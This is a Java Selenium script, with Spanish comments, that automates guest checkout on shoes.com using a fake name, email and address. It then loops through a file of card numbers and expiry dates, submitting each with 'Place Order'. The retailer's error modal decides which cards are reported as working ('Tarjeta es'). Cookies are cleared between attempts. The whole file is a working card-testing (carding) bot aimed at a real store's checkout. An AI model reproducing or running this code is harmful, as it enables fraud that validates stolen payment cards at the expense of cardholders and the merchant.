package app;

import java.io.BufferedReader;
import java.io.FileReader;
import java.util.concurrent.TimeUnit;
import javax.swing.JFileChooser;
import org.openqa.selenium.By;
import org.openqa.selenium.Keys;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebDriverException;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.chrome.ChromeOptions;
import org.openqa.selenium.support.ui.Select;

/**
 *
 * @author Michael García A
 */
public class Test {

    public static void main(String[] args) {
        System.setProperty("webdriver.chrome.driver", "chromedriver.exe");
        ChromeOptions options = new ChromeOptions();
        options.addArguments("start-maximized");
        options.addArguments("disable-infobars");
        WebDriver driver;
        try {
            driver = new ChromeDriver(options);
            JFileChooser buscaArchivo = new JFileChooser();
            buscaArchivo.showOpenDialog(buscaArchivo);

            String patch = buscaArchivo.getSelectedFile().getAbsolutePath();
            try {
//            driver.get("https://www.shoes.com/johnston-murphy-performance-loafer/614421/1262220");
//
////            try {
////                //ACCEDER A LOS ELEMENTOS DEL DOM POR MEDIO DE SU ID O CLASE O NOMBRE         
//            /*
//                    Botón agregar compra
//             */
//            WebElement button = driver.findElement(By.id("add-cart"));
//            //DESPUÉS PUEDO USAR METODOS COMO EL CLICK
//            button.click();
//
//            /*
//                    Botón checkout
//             */
//            Thread.sleep(1000);
//            WebElement buttonCheckout = driver.findElement(By.className("crt-proceed-btn"));
//
//            buttonCheckout.click();
//            /*
//                    Formulario de email
//             */
//            Thread.sleep(3000);
//            WebElement email = driver.findElement(By.xpath("(//INPUT[@type='email'])[2]"));
//
//            email.sendKeys("anonimo123@gmail.com");
//            Thread.sleep(3000);
//            email.sendKeys(Keys.ENTER);
//
//            /*
//                    Formulario de registro de datos
//             */
//            Thread.sleep(3000);
//            WebElement firsName = driver.findElement(By.name("firstName"));
//            firsName.sendKeys("Pepito");
//
//            WebElement lastName = driver.findElement(By.name("lastName"));
//            lastName.sendKeys("Perez");
//
//            WebElement address1 = driver.findElement(By.name("address1"));
//            address1.sendKeys("Ninguna");
//
//            WebElement address2 = driver.findElement(By.name("address2"));
//            address2.sendKeys("Ninguna");
//
//            WebElement city = driver.findElement(By.name("city"));
//            city.sendKeys("San diego");
//
//            WebElement stateProvince = driver.findElement(By.name("stateProvince"));
//            Select selectState = new Select(stateProvince);
//            selectState.selectByValue("CA");
//
//            WebElement postalCode = driver.findElement(By.name("postalCode"));
//            postalCode.sendKeys("90001");
//
//            WebElement phoneNumber = driver.findElement(By.name("phoneNumber"));
//            phoneNumber.sendKeys("1234679381");
//
//            phoneNumber.sendKeys(Keys.ENTER);
//            Thread.sleep(3000);
                //runAuto(driver);
                //driver.get("https://www.shoes.com/prana-printed-double-headband/634345/1827327");

                runAuto(driver);

                //String archivo = "archivo.txt";
                String cadena;
                FileReader file = new FileReader(patch);
                BufferedReader b = new BufferedReader(file);
                String numeroBean = "";
                String numeroMes = "";
                String numeroAnio = "";
                boolean valor = false;
                //WebElement modal = driver.findElement(By.xpath("//DIV[@id='modal-generic-error']/self::DIV#"));
                do {

                    while ((cadena = b.readLine()) != null) {
                        System.out.println(cadena);

                        for (int i = 0; i < cadena.length(); i++) {
                            numeroBean = cadena.substring(0, 16);
                            numeroMes = cadena.substring(17, 19);
                            numeroAnio = cadena.substring(20, 24);

                        }
                        Thread.sleep(3000);
                        WebElement number = driver.findElement(By.name("number"));
                        number.sendKeys(numeroBean);
                        WebElement mes = driver.findElement(By.name("expMonth"));
                        Select selectMes = new Select(mes);
                        selectMes.selectByValue(numeroMes);
                        WebElement anio = driver.findElement(By.name("expYear"));
                        Select selectAnio = new Select(anio);
                        selectAnio.selectByValue(numeroAnio);
                        Thread.sleep(3000);
                        number.sendKeys(Keys.ENTER);
                        Thread.sleep(3000);
                        WebElement buttonCompra = driver.findElement(By.xpath("//BUTTON[@class='sb-button-1 sb-button-1--primary chk-proceed-btn right'][text()='Place Order'][text()='Place Order']/self::BUTTON"));
                        buttonCompra.click();
                        Thread.sleep(2000);
                        //WebDriver driver = new FirefoxDriver();
                        
                        
                        WebElement modal = driver.findElement(By.id("modal-generic-error"));
                        valor = modal.isDisplayed();
                        if (valor) {
                            Thread.sleep(2000);
                            WebElement modalClose = driver.findElement(By.className("close"));
                            modalClose.click();
                            Thread.sleep(2000);
                            WebElement editeTarjet = driver.findElement(By.xpath("//A[@href='#'][text()='EDIT']/self::A"));
                            editeTarjet.click();
                            Thread.sleep(2000);
                            WebElement addediteTarjet = driver.findElement(By.className("chk-pay-opt--new"));
                            //chk-option-box chk-option-box--add 
                            addediteTarjet.click();
                            WebElement checkoutForm = driver.findElement(By.xpath("//INPUT[@class='chk-pay-match-addr']/self::INPUT"));
                            Thread.sleep(2000);
                            checkoutForm.click();

                        } else {
                            System.out.println("Tarjeta es " + numeroBean);
                            driver.manage().deleteAllCookies();
                            Thread.sleep(4000);
                            runAuto(driver);

                        }
//                        System.out.println("Valor es "+valor);
//                        j = verificarModal(valor);
//                        if (j==1) {
//                            Thread.sleep(2000);
//                            WebElement modalClose = driver.findElement(By.className("modal-footer"));
//                            modalClose.click();
//                        }else{
//                            System.out.println("Tarjeta encontrada");
//                        }
//                                    
                    }
                } while (valor == true);

            } catch (WebDriverException e) {
                System.out.println("Excepcion dentro de los parametros tarjeta");
                System.out.println(e.getMessage());
                System.out.println(e.getSystemInformation());
            }
        } catch (Exception e) {
            System.out.println("Excepcion dentro del driver");
        }

    }

    public static void runAuto(WebDriver driver) {
        try {
            driver.get("https://www.shoes.com/johnston-murphy-performance-loafer/614421/1262220");

//            try {
//                //ACCEDER A LOS ELEMENTOS DEL DOM POR MEDIO DE SU ID O CLASE O NOMBRE         
            /*
                    Botón agregar compra
             */
            WebElement button = driver.findElement(By.id("add-cart"));
            //DESPUÉS PUEDO USAR METODOS COMO EL CLICK
            button.click();

            /*
                    Botón checkout
             */
            Thread.sleep(2000);
            WebElement buttonCheckout = driver.findElement(By.className("crt-proceed-btn"));
            //WebElement buttonCheckout = driver.findElement(By.xpath("//BUTTON[@class='sb-button-1 sb-button-1--primary crt-proceed-btn'][text()='Checkout'][text()='Checkout']/self::BUTTON"));
            Thread.sleep(2000);
            buttonCheckout.click();
            /*
                    Formulario de email
             */
            Thread.sleep(3000);
            //WebElement email = driver.findElement(By.xpath("(//INPUT[@type='email'])[2]"));
            WebElement email = driver.findElement(By.name("guestEmail"));

            email.sendKeys("anonimo123@gmail.com");
            Thread.sleep(3000);
            email.sendKeys(Keys.ENTER);

            /*
                    Formulario de registro de datos
             */
            Thread.sleep(3000);
            WebElement firsName = driver.findElement(By.name("firstName"));
            firsName.sendKeys("Pepito");

            WebElement lastName = driver.findElement(By.name("lastName"));
            lastName.sendKeys("Perez");

            WebElement address1 = driver.findElement(By.name("address1"));
            address1.sendKeys("Ninguna");

            WebElement address2 = driver.findElement(By.name("address2"));
            address2.sendKeys("Ninguna");

            WebElement city = driver.findElement(By.name("city"));
            city.sendKeys("San diego");

            WebElement stateProvince = driver.findElement(By.name("stateProvince"));
            Select selectState = new Select(stateProvince);
            selectState.selectByValue("CA");

            WebElement postalCode = driver.findElement(By.name("postalCode"));
            postalCode.sendKeys("90001");

            WebElement phoneNumber = driver.findElement(By.name("phoneNumber"));
            phoneNumber.sendKeys("1234679381");

            phoneNumber.sendKeys(Keys.ENTER);
            Thread.sleep(3000);
        } catch (Exception e) {
            System.out.println("Excepcion dentro de los parametros formulario " + e.getMessage());
            System.out.println(e.getLocalizedMessage());
        }
    }

}
